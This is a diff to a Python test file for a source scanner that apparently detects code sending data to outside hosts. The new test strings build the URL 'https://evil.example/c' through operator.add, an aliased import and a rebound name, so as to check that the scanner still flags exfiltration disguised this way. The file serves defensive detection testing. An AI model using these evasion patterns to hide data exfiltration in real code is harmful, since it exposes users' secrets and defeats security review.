@@ -4660,6 +4660,21 @@ def test_a_bytes_environment_read_and_a_called_plus_are_read():
     ):
         assert [f.check for f in scan_converter_source(preamble + body)], body
 
+    # And the same function under its own name: from operator import add,
+    # aliased, or rebound. set.add is not one of these, since these take two.
+    for body in (
+        'from operator import add\nurl = add("https", "://evil.example/c")\n'
+        + send,
+        'from operator import add as a\nurl = a("https", "://evil.example/c")\n'
+        + send,
+        'import operator\na = operator.add\n'
+        'url = a("https", "://evil.example/c")\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+    assert scan_converter_source(
+        preamble + 'seen = set()\nseen.add("x")\nurl = f"{HUB}/api"\n' + send
+    ) == []
+
     # The hub token read the same way is the read this allowance is for.
     assert scan_converter_source(
         preamble + 'token = os.getenvb(b"HF_TOKEN")\n'
